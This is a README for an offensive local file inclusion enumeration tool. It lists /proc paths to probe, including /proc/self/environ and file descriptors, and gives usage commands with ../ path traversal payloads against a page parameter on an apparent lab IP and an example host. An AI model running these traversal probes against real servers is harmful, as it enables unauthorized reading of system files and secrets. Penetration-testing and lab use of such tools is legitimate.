# sl0ppy-lfi
A small lfi enum tool, i upgraded the original source a bits here and there.  

# Added searches
* /proc/loginuid
* /proc/maps
* /proc/patch-state
* /proc/numa_maps
* /proc/stack
* /proc/personality
* /proc/pagemap
* /proc/cgroup
* /proc/sched
* /proc/mounts
* /proc/status
* /proc/environ
* /proc/shedstat
* /proc/meminfo
* /proc/self/
* /proc/self/stat
* /proc/self/environ
* /proc/self/maps/
* /proc/self/fd/
* and more
# Usage 

# Enum all
* `./sl0ppy-lfi http://10.10.11.154/index.php?page=` 
* `./sl0ppy-lfi http://10.10.11.154/index.php?page=../../../../../../../../../../` 


# enum specific stuff like only libc
* `./sl0ppy-lfi http://10.10.11.154/index.php?page= | grep "libc"`
* `./sl0ppy-lfi http://10.10.11.154/index.php?page=../../../../../../../../../../ | grep "libc"` 

# Output Enum 
* `./sl0ppy-lfi http://10.10.11.154/index.php?page= > output && cat output`  

# sl0ppy-ProcessInfo
`./sl0ppy-ProcessInfo http://server.vulnerable.com/download.php?file=` 
